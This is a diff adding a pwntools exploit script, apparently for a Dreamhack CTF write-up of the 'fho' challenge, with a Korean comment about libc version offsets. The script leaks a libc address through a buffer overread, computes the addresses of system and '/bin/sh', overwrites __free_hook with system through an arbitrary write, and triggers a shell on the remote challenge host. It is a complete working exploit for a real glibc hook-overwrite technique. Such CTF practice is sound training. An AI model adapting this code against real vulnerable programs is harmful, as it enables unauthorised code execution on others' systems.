@@ -55,3 +55,40 @@ int main() {
 
 <br>
 
+```python
+from pwn import *
+
+p = remote('host3.dreamhack.games',16610)
+#p = process('./fho')
+e = ELF('./fho')
+libc = ELF('./libc-2.27.so')
+# libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so') -> ubuntu 20.04
+
+leak_main_ret = b"A"*0x40 + b"B"*0x8
+p.sendafter(b'Buf: ',leak_main_ret)
+p.recvuntil(b'Buf: ' + leak_main_ret)
+libc_start_main_231 = u64(p.recvn(6)+b"\x00"*2)
+
+# libc_base + libc.symbols['__libc_start_main'] = libc_start_main
+# libc_start_main + 231 = libc_start_main_231 
+# 20.04에서는 243인데, 위의 라이브러리에서는 231인가보다..
+
+libc_base = libc_start_main_231 - (libc.symbols['__libc_start_main']+231)
+system_addr = libc_base + libc.symbols['system']
+free_hook = libc_base + libc.symbols["__free_hook"]
+binsh = libc_base + next(libc.search(b'/bin/sh'))
+
+print("@ libc_base: ", hex(libc_base))
+print("@ system: ",hex(system_addr))
+print("@ free_hook: ", hex(free_hook))
+print("@ binsh: ",hex(binsh))
+
+# Arbitary-Address-Write
+p.sendlineafter(b'To write: ', str(free_hook))
+p.sendlineafter(b'With: ',str(system_addr))
+
+# Exploit
+p.sendlineafter(b'To free: ',str(binsh))
+
+p.interactive()
+```
